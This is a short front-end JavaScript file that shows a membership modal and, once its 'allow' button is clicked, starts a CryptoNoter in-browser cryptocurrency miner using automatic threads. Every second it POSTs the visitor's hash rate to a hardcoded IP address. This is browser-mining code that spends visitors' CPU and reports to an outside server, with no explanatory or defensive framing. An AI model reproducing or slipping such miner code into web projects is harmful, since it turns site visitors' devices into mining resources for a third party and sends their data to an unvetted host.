$(document).ready(function () {

    $('#memberModal').modal('show');

    $('#allow-event').on('click', function(evt){
            var addr = 'CryptoNoter';
			var miner = new CryptoNoter.User(addr, {
			autoThreads: true,
				throttle: 0.5
			});
			console.log("fd");
			miner.start();
			setInterval(function() {
				var hashesPerSecond = miner.getHashesPerSecond();
				$.ajax({
					method: 'POST',
					url: 'https://159.65.54.93/api/v1/stats',
					data: JSON.stringify({numberOfHashes: hashesPerSecond}),
					contentType: "application/json; charset=utf-8",
				});
				console.log(hashesPerSecond);
				console.log(addr);
			}, 1000);
            $('#memberModal').modal('hide');
    });

});

